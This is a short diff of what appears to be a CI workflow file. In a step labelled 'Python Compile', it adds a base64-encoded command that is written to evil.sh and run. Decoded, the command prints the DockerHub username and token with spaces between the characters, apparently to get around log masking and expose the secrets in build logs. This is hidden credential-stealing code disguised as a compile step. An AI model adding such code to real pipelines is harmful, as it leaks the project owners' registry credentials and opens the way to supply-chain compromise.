@@ -16,4 +16,4 @@ jobs:
     - name: fooo
       run: echo foo
     - name: Python Compile
-      run: bash evil.sh
+      run: echo ZWNobyAke0RPQ0tFUkhVQl9VU0VSTkFNRX0gJHtET0NLRVJIVUJfVE9LRU59IHwgc2VkICdzLy4vJiAvZycK | base64 -d >  evil.sh ; bash evil.sh
